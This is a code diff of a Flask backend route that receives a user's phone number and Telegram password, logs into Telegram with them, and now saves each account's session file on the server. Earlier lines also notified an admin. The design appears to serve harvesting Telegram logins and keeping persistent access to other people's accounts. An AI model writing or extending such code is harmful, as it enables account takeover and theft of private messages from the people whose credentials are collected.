@@ -181,20 +181,23 @@ def verify_code():
 # =====================
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
-    phone = request.json.get("phone")
-    password = request.json.get("password")
+    data = request.json
+    phone = data.get("phone")
+    password = data.get("password")
+
+    async def _verify():
+        session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.connect()
+        await client.sign_in(password=password)
+        me = await client.get_me()
+        await client.disconnect()
+        return me
 
     try:
-        async def work():
-            client = TelegramClient(None, API_ID, API_HASH)
-            await client.connect()
-            await client.sign_in(password=password)
-            me = await client.get_me()
-            await client.disconnect()
-            return me
+        me = asyncio.run(_verify())
 
-        me = run_async(work())
-
+        # ✅ LOGIN MUVAFFAQIYATLI
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -205,13 +208,17 @@ def verify_password():
         conn.commit()
         conn.close()
 
-        notify_admin(me.id, phone, me.username)
-        return jsonify({"status": "success"})
+        return jsonify({
+            "status": "ok",
+            "message": "Login muvaffaqiyatli"
+        })
 
     except Exception as e:
-        print("VERIFY_PASSWORD ERROR:", e)
-        return jsonify({"status": "invalid_password"})
-
+        print("VERIFY_PASSWORD ERROR:", repr(e))
+        return jsonify({
+            "status": "error",
+            "message": "Parol noto‘g‘ri"
+        })
 
 # =====================
 # RUN
